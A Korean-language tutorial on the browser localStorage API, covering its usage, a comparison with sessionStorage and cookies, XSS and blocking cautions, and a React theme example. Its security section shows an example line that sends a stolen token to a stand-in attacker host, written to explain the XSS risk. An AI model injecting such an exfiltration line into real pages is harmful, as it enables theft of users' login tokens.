브라우저에 **데이터를 영구적으로 저장할 수 있는 클라이언트 사이드 저장소**입니다.

## 핵심 특징

```
localStorage
→ 브라우저에 key-value 형태로 저장
→ 탭/창을 닫아도 데이터 유지 (영구 저장)
→ 서버에 전송 안 됨 (클라이언트에만 존재)
→ 같은 출처(Origin)에서만 접근 가능
→ 용량: 약 5MB
```

## 기본 사용법

```javascript
// 저장
localStorage.setItem('token', 'abc123');
localStorage.setItem('user', JSON.stringify({ name: 'kim', age: 25 }));

// 조회
const token = localStorage.getItem('token');        // 'abc123'
const user  = JSON.parse(localStorage.getItem('user')); // { name: 'kim' }

// 삭제
localStorage.removeItem('token');

// 전체 삭제
localStorage.clear();
```

## 브라우저 저장소 비교

||localStorage|sessionStorage|Cookie|
|---|---|---|---|
|**유지 기간**|영구|탭 닫으면 삭제|만료일 설정|
|**용량**|~5MB|~5MB|~4KB|
|**서버 전송**|❌|❌|✅ (자동)|
|**접근 범위**|같은 출처|같은 탭|설정에 따라|

## 주의사항

### 보안 문제 - XSS 취약점

```javascript
// ❌ JWT 토큰을 localStorage에 저장하면
localStorage.setItem('token', 'jwt_token_here');

// XSS 공격으로 스크립트 삽입 시 토큰 탈취 가능
// 악의적인 스크립트가 실행되면
const stolen = localStorage.getItem('token');
fetch('https://attacker.com?token=' + stolen);  // 토큰 탈취 ❌

// ✅ 민감한 인증 정보는 HttpOnly Cookie에 저장
// HttpOnly Cookie는 JS로 접근 불가 → XSS 방어
```

### 동기적 처리 - 메인 스레드 블로킹

```javascript
// localStorage는 동기 API → 대용량 데이터 처리 시 UI 멈춤
localStorage.setItem('bigData', JSON.stringify(hugeArray));  // ❌

// 대용량 데이터는 IndexedDB 사용 (비동기)
```

## 적합한 사용 사례

```
✅ 적합
- 사용자 UI 설정 (다크모드, 언어 설정)
- 비로그인 장바구니
- 최근 검색어
- 민감하지 않은 사용자 환경설정

❌ 부적합
- JWT 토큰, 인증 정보 (XSS 취약)
- 개인정보, 결제 정보
- 대용량 데이터
```

## React에서 활용

```jsx
// 다크모드 설정 유지
function App() {
    const [isDark, setIsDark] = useState(
        () => localStorage.getItem('theme') === 'dark'  // 초기값 복원
    );

    const toggleTheme = () => {
        const next = !isDark;
        setIsDark(next);
        localStorage.setItem('theme', next ? 'dark' : 'light');  // 저장
    };

    return (
        <div className={isDark ? 'dark' : 'light'}>
            <button onClick={toggleTheme}>테마 전환</button>
        </div>
    );
}
```

> localStorage는 **"서버 없이 브라우저에 간단한 데이터를 유지할 때"** 유용합니다. 단, JS로 누구나 접근 가능하므로 **민감한 정보는 절대 저장하면 안 됩니다.**